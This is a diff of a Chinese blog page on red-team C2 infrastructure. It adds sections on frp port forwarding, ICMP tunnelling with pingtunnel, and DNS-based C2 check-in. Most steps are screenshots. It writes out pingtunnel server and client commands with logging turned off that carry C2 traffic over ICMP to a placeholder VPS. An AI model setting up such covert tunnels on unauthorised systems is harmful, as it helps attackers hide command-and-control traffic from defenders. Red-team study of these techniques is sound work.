@@ -133,7 +133,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/%E7%BA%A2%E9%98%9F%E5%9F%BA%E5%BB%BA/" style="color: #ff7d73">
+                <a href="/tags/%E7%BA%A2%E9%98%9F%E5%9F%BA%E5%BB%BA/" style="color: #03a9f4">
                     红队基建
                 </a>
             </span>
@@ -164,10 +164,35 @@
 <p>profile使用</p>
 <p><img src="/images/c2%E5%9F%BA%E5%BB%BA/20.jpg" alt="20"></p>
 <h4 id="3-4http跳板机重定向"><a href="#3-4http跳板机重定向" class="headerlink" title="3.4http跳板机重定向"></a>3.4http跳板机重定向</h4><p><img src="/images/c2%E5%9F%BA%E5%BB%BA/21.jpg" alt="21"></p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/22.jpg" alt="21"></p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/23.jpg" alt="21"></p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/24.jpg" alt="21"></p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/25.jpg" alt="21"></p>
+<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/22.jpg" alt="22"></p>
+<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/23.jpg" alt="23"></p>
+<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/24.jpg" alt="24"></p>
+<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/25.jpg" alt="25"></p>
+<h2 id="4-端口转发"><a href="#4-端口转发" class="headerlink" title="4.端口转发"></a>4.端口转发</h2><p>配置好frp服务端和客户端,将客户端端口代理到服务端</p>
+<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/26.jpg" alt="26"></p>
+<p>通过代理端ip能访问到客户端服务</p>
+<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/27.jpg" alt="27"></p>
+<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/28.jpg" alt="28"></p>
+<h2 id="5-隧道上线"><a href="#5-隧道上线" class="headerlink" title="5.隧道上线"></a>5.隧道上线</h2><h4 id="5-1ICMP上线"><a href="#5-1ICMP上线" class="headerlink" title="5.1ICMP上线"></a>5.1ICMP上线</h4><p>开两个监听，一个vps一个127</p>
+<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/29.jpg" alt="29"></p>
+<p>VPS开服务</p>
+<p>sudo .&#x2F;pingtunnel -type server -noprint 1 -nolog 1</p>
+<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/30.jpg" alt="30"></p>
+<p>客户端转发流量</p>
+<p>pingtunnel.exe -type client -l :9999 -s VPSIP -t VPSIP:PORT -tcp 1 -noprint 1 -nolog 1</p>
+<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/31.jpg" alt="31"></p>
+<p>ICMP上线</p>
+<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/32.jpg" alt="32"></p>
+<h4 id="5-2DNS上线"><a href="#5-2DNS上线" class="headerlink" title="5.2DNS上线"></a>5.2DNS上线</h4><p>买个域名备案</p>
+<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/33.jpg" alt="33"></p>
+<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/34.jpg" alt="34"></p>
+<p>释放DNS端口</p>
+<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/35.jpg" alt="35"></p>
+<p>ns记录后生成payload</p>
+<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/36.jpg" alt="36"></p>
+<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/37.jpg" alt="37"></p>
+<p>上线</p>
+<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/38.jpg" alt="38"></p>
 
     </div>
     
